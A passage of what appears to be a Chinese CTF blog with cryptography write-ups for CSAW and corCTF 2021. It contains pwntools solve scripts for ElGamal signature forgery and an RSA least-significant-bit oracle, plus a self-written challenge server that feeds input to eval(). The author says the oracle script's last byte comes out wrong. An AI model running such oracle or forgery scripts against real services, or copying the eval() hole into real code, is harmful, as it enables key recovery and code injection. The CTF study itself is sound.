class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = <span class="string">b&#x27;Felicity Cisco&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./forgery.py&quot;</span>])</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;Answer:&#x27;</span>).decode()</span><br><span class="line">    p, _, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    B, C = randint(<span class="number">2</span>, p - <span class="number">2</span>), randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> gcd(C, p - <span class="number">1</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, B, p) * <span class="built_in">pow</span>(y, C, p) % p</span><br><span class="line">    s = -r * invert(C, p - <span class="number">1</span>) % (p - <span class="number">1</span>)</span><br><span class="line">    u = u + <span class="built_in">hex</span>(-r * invert(C, p - <span class="number">1</span>) * B % (p - <span class="number">1</span>))[<span class="number">2</span>:].rjust(<span class="number">1024</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendline(u)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(s))</span><br><span class="line">    flag = sh.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="RSA-Pop-Quiz（unsolved）"><a href="#RSA-Pop-Quiz（unsolved）" class="headerlink" title="RSA Pop Quiz（unsolved）"></a>RSA Pop Quiz（unsolved）</h2><blockquote>
<p>nc crypto.chal.csaw.io 5008</p>
</blockquote>
<blockquote>
<p>Wiener wiener chicken dinner</p>
</blockquote>
<blockquote>
<p>Who came up with this math term anyway?</p>
</blockquote>
<p>来，学习一下<strong>Least Significant Bit Oracle Attack</strong></p>
<p>可惜已经第二天醒来，比赛已经结束了，服务也关了，苦露西，苦露西</p>
<p>来，学习一下<strong>Least Significant Bit Oracle Attack</strong></p>
<p>比赛要结束关我菜鸡什么事</p>
<hr>
<h3 id="Least-Significant-Bit-Oracle-Attack-（LSB-Oracle-Attack-Parity-Oracle）"><a href="#Least-Significant-Bit-Oracle-Attack-（LSB-Oracle-Attack-Parity-Oracle）" class="headerlink" title="Least Significant Bit Oracle Attack （LSB Oracle Attack / Parity Oracle）"></a>Least Significant Bit Oracle Attack （LSB Oracle Attack / Parity Oracle）</h3><p>该攻击使用的条件很简单，我们可以进行解密，并且会有oracle告诉我们明文的奇偶性，时间复杂度是$O(logN)$</p>
<p>假设已知的为enc，我们构造密文C<br>$$<br>C=(2^e\cdot c)\ mod\ n=(2^e\cdot m^e)\ mod\ n=(2\cdot m)^e\ mod\ n<br>$$<br>我们将这个密文send过去，那么显然对应的明文就是$M=(2\cdot m)\ mod\ n$</p>
<p>oracle会告诉我们M的奇偶性，也就是最低位<code>lsb</code>是0还是1</p>
<p>由此我们可以进行推导，得出的结论如下</p>
<ul>
<li>如果<code>lsb</code>是0，说明$m&lt;\frac{n}{2}$</li>
<li>如果<code>lsb</code>是1，说明$m\geq \frac{n}{2}$；如果2m大于n，但注意m是不会超过n的，所以2m就不会超过2n，则$2m\ mod\ n=2m - n$，n是奇数，2m偶数，那么M是奇数，lsb是1</li>
</ul>
<p>这样一次就可以将m限定在$\frac{n}{2}$的左边后者是右边，之后就是不断地二分，知道找到真正的m。因为运用二分的思想，所以时间复杂度才会是$log$</p>
<p>接下来就是继续构造<br>$$<br>C=(2^e\cdot C)\ mod\ n=(2^e\cdot (2\cdot M)^e)\ mod\ n=(4\cdot m)^e\ mod\ n<br>$$<br>将C给send过去就可以在，获得oracle，就可以将C限定在$\frac{n}{4}$的空间里</p>
<hr>
<p>可惜坏境关了。。。</p>
<p>！！！环境关了就自己创造环境（感谢web服务端老师第一节课就要求我们买服务器，虽然刀了我九十九大洋，但不仅让我可以水一篇<a href="https://blog.csdn.net/m0_49109277/article/details/120402420">Crypto出题的博客</a>，以后还可和web和pwn一样复现环境）</p>
<p>诶呀，这题没有源码，woc，苦露西</p>
<p>自己写一个吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"></span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    pt = <span class="string">&quot;&quot;</span>.join([space[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(space) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    ct = hashlib.sha256(pt.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SHA-256(XXXX+&#123;&#125;) == &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pt[<span class="number">4</span>:], ct))</span><br><span class="line">    guess = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please give me XXXX: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256((guess + pt[<span class="number">4</span>:]).encode()).hexdigest() != ct:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sorry, it seems you are not qualified&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27; ██       ██          ██                                          ██              ██        ████████ ██████</span></span><br><span class="line"><span class="string">░██      ░██         ░██                                         ░██             ░██       ██░░░░░░ ░█░░░░██</span></span><br><span class="line"><span class="string">░██   █  ░██  █████  ░██  █████   ██████  ██████████   █████    ██████  ██████   ░██      ░██       ░█   ░██</span></span><br><span class="line"><span class="string">░██  ███ ░██ ██░░░██ ░██ ██░░░██ ██░░░░██░░██░░██░░██ ██░░░██  ░░░██░  ██░░░░██  ░██      ░█████████░██████</span></span><br><span class="line"><span class="string">░██ ██░██░██░███████ ░██░██  ░░ ░██   ░██ ░██ ░██ ░██░███████    ░██  ░██   ░██  ░██      ░░░░░░░░██░█░░░░ ██</span></span><br><span class="line"><span class="string">░████ ░░████░██░░░░  ░██░██   ██░██   ░██ ░██ ░██ ░██░██░░░░     ░██  ░██   ░██  ░██             ░██░█    ░██</span></span><br><span class="line"><span class="string">░██░   ░░░██░░██████ ███░░█████ ░░██████  ███ ░██ ░██░░██████    ░░██ ░░██████   ░████████ ████████ ░███████</span></span><br><span class="line"><span class="string">░░       ░░  ░░░░░░ ░░░  ░░░░░   ░░░░░░  ░░░  ░░  ░░  ░░░░░░      ░░   ░░░░░░    ░░░░░░░░ ░░░░░░░░  ░░░░░░░&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line">choices = [<span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&#x27;do you wanna decrypt? (yes / no): &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice <span class="keyword">not</span> <span class="keyword">in</span> choices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sorry! i can&#x27;t do this way &quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == choices[<span class="number">0</span>]:</span><br><span class="line">        cx = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;please give me your ciphertext: &#x27;</span>))</span><br><span class="line">        mx = <span class="built_in">pow</span>(cx, d, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this is what you want:&#x27;</span>, mx % <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tempt = <span class="built_in">input</span>(<span class="string">&#x27;tell me your plaintext: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tempt == bytes_to_long(flag.encode()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;congratulation! you are right: &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;sorry! bye! &#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp差不多这样吧，有点奇怪，后面收尾的时候不太对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"></span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work1</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(XXXX+8OeVCGS9zB8w) == c35d202a83694cfcace7a0cca784594ba3e984e3ced62714d08189d8bb03f6f0</span></span><br><span class="line">    proof = sh.recvuntil(<span class="string">b&#x27;please give me XXXX:&#x27;</span>)</span><br><span class="line">    tail = proof[<span class="number">13</span>:<span class="number">25</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">30</span>:<span class="number">94</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(XXXX+8OeVCGS9zB8w) == c35d202a83694cfcace7a0cca784594ba3e984e3ced62714d08189d8bb03f6f0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;35ec0130a578&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;25da550b7b027fb3b802bf1c0234c30b59f17ff3a2a7f6f33e3428e6c0d162df&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            <span class="built_in">print</span>(head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work1()</span><br><span class="line">content = sh.recvuntil(<span class="string">b&#x27;do you wanna decrypt? (yes / no):&#x27;</span>).decode()</span><br><span class="line">n, e, c = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> findall(<span class="string">r&#x27;\d+&#x27;</span>, content)]</span><br><span class="line">C = c</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = n - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m = (i + j) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> i &gt;= j:</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;please give me your ciphertext:&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(c))</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;this is what you want:&#x27;</span>)</span><br><span class="line">        ans = sh.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;1&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        	<span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="number">2</span>*(m//<span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">    C = <span class="number">2</span> ** e * C % n</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;please give me your ciphertext:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(C))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;this is what you want:&#x27;</span>)</span><br><span class="line">    ans = sh.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;0&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        j = m</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;1&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        i = m</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922223905766.png" alt="image-20210922223905766"></p>
<p>最后一位显然不对，应该是左花括号，不知道为什么</p>
<p>应该是少了一个直接加密c的结果，看了别的师傅的博客，最后要加一下，不过试过了不太行</p>
<p>最后一层套娃是泄漏d低位，也是可以解的，具体参考la佬的博客</p>
<h2 id="Bits（unsolved）"><a href="#Bits（unsolved）" class="headerlink" title="Bits（unsolved）"></a>Bits（unsolved）</h2><blockquote>
<p>I wrote this oracle in rust so that it can’t sue companies over java stuff.</p>
<p>Author: CryptoHack (<code>Robin_Jadoul</code> and <code>jack</code>)</p>
</blockquote>
<p>emmmm竟然是rust语言写的，有空学一下</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上午羊城杯结束，去看RCTF的密码，看的有点懵，看懂了代码之后就无从下手，两道密码，出的师傅还是大有人在的</p>
<p>然后下午看了hub上，发现错过了一些比赛的报名，就国外的CSAW开赛后还可以报，就在打了；做出一道签到，感觉有点打不动，倒不是题目难，感觉有点饱和，果然不能一天到晚坐在屏幕前面，多出去走走，运动运动，谈谈恋爱多好</p>
<p>菜归菜，还是要注意劳逸结合</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210821 corCTF YauzaCTFCrypto&amp;OISNT方向部分WP</title>
    <url>/posts/493b5ffc/</url>
    <content><![CDATA[<p>熟悉的界面，赛后复现，前两天有祥云杯</p>
<p>看到好多师傅都给全a了</p>
<span id="more"></span>

<h1 id="corCTF"><a href="#corCTF" class="headerlink" title="corCTF"></a>corCTF</h1><h2 id="Crypto-fibinary"><a href="#Crypto-fibinary" class="headerlink" title="Crypto-fibinary"></a>Crypto-fibinary</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">11</span>):</span><br><span class="line">	fib.append(fib[i - <span class="number">1</span>] + fib[i - <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c2f</span>(<span class="params">c</span>):</span></span><br><span class="line">	n = <span class="built_in">ord</span>(c)</span><br><span class="line">	b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> n &gt;= fib[i]:</span><br><span class="line">			n -= fib[i]</span><br><span class="line">			b += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			b += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">	enc += c2f(c) + <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(enc.strip())</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line">enc = <span class="string">&#x27;10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100&#x27;</span></span><br><span class="line">enc = enc.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fib)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n += fib[<span class="built_in">len</span>(fib)-j-<span class="number">1</span>]</span><br><span class="line">    flag += <span class="built_in">chr</span>(n)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{b4s3d_4nd_f1bp!113d}</p>
</blockquote>
<h2 id="Crypto-4096"><a href="#Crypto-4096" class="headerlink" title="Crypto-4096"></a>Crypto-4096</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> private <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prod</span>(<span class="params">lst</span>):</span></span><br><span class="line">	ret = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> lst:</span><br><span class="line">		ret *= num</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">primes = [getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">n = prod(primes)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293</span></span><br><span class="line">c = <span class="number">15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factor(n):</span><br><span class="line">    phi *= i[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, phi), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}</p>
</blockquote>
<h2 id="Crypto-dividing-secrets"><a href="#Crypto-dividing-secrets" class="headerlink" title="Crypto-dividing_secrets"></a>Crypto-dividing_secrets</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">LIMIT = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">	p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">	g = randrange(<span class="number">1</span>, p)</span><br><span class="line">	<span class="keyword">return</span> g, p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	g, p = gen()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;g:&quot;</span>, <span class="built_in">str</span>(g))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>, <span class="built_in">str</span>(p))</span><br><span class="line">	x = bytes_to_long(flag)</span><br><span class="line">	enc = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;encrypted flag:&quot;</span>, <span class="built_in">str</span>(enc))</span><br><span class="line">	ctr = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> ctr &lt; LIMIT:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			div = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;give me a number&gt; &quot;</span>))</span><br><span class="line">			<span class="built_in">print</span>(<span class="built_in">pow</span>(g, x // div, p))</span><br><span class="line">			ctr += <span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;whoops..&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;no more tries left... bye&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>以为我没有打祥云杯吗，可笑</p>
<p>直接二分法逼近</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc crypto.be.ax 6000</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">l = <span class="number">10</span> ** <span class="number">153</span></span><br><span class="line">r = <span class="number">10</span> ** <span class="number">154</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;crypto.be.ax&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;g: &#x27;</span>)</span><br><span class="line">    g = <span class="built_in">int</span>(sh.recvline())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;p: &#x27;</span>)</span><br><span class="line">    p = <span class="built_in">int</span>(sh.recvline())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;encrypted flag: &#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            sh.recvuntil(<span class="string">b&#x27;give me a number&gt;&#x27;</span>)</span><br><span class="line">            mid = (l + r) // <span class="number">2</span></span><br><span class="line">            sh.sendline(<span class="built_in">str</span>(mid).encode())</span><br><span class="line">            t = sh.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;corctf&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(mid):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(mid))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(t.decode()) == <span class="number">1</span>:</span><br><span class="line">                r = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{qu4drat1c_r3s1due_0r_n0t_1s_7h3_qu3st1on8852042051e57492}</p>
</blockquote>
<p>但是看到flag，说是二次剩余，又是非预期？之前做InCTF的<a href="https://blog.csdn.net/m0_49109277/article/details/119841199?spm=1001.2014.3001.5501">Gold_digger</a>时，做到GM同态加密，其中就有用到二次剩余，二次非剩余</p>
<p>emmmmm非预期就非预期吧</p>
